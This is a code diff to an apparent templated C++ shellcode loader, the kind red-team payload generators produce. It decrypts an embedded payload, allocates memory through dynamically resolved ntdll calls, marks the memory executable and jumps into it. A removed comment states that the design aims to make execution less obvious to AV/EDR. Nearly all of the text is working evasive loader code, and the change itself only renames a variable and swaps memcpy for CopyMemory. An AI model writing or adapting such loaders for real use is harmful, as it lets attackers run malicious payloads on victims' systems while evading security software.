@@ -9,7 +9,6 @@
 // After template runs, the payload gets decrypted in memory and copied into a variable located in .text section.
 auto tmpPayload __attribute__((used)) __attribute__((section("<%= section_name %>"))) = <%= payload_declaration %>;
 
-// A storage for final decrypted payload. It is specifically stored in .text section as it seems to make execution less obvious to AV/EDR when it's being executed from .text section.
 //extern "C" {
 //    __attribute__((used, section(".text"), aligned(16)))
 //    unsigned char finalPayload[<%= payload_length %>] = { 0x0 };  // one byte initializes; rest zero-filled by compiler
@@ -50,7 +49,7 @@ int main() {
     DWORD dwOldProtect;
     unsigned long scsize;
     NTSTATUS STATUS = 0;
-    PVOID pfinalPayload;
+    PVOID pFinalPayload;
     SIZE_T scsize_t = <%= payload_length %>;
 
     scsize = <%= payload_length %>;
@@ -60,25 +59,25 @@ int main() {
       return 1;
     }
 
-    STATUS = CALL_EXPORT("ntdll.dll", "NtAllocateVirtualMemory", int(*)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG), (HANDLE)-1, &pfinalPayload, 0, &scsize_t, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    STATUS = CALL_EXPORT("ntdll.dll", "NtAllocateVirtualMemory", int(*)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG), (HANDLE)-1, &pFinalPayload, 0, &scsize_t, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     
     if (STATUS != 0) {
       return 1;
     }
 
-    if(!VirtualProtect(pfinalPayload, scsize, PAGE_READWRITE, &dwOldProtect))
+    if(!VirtualProtect(pFinalPayload, scsize, PAGE_READWRITE, &dwOldProtect))
     {
       return 1;
     }
 
-    memcpy(pfinalPayload, tmpPayload, scsize);
+    CopyMemory(pFinalPayload, tmpPayload, scsize);
 
-    if(!VirtualProtect(pfinalPayload, scsize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
+    if(!VirtualProtect(pFinalPayload, scsize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
     {
       return 1;
     }
     
-    char * payload_fnc = (char*)pfinalPayload;
+    char * payload_fnc = (char*)pFinalPayload;
 	
     (*(void (*)()) payload_fnc)();
 
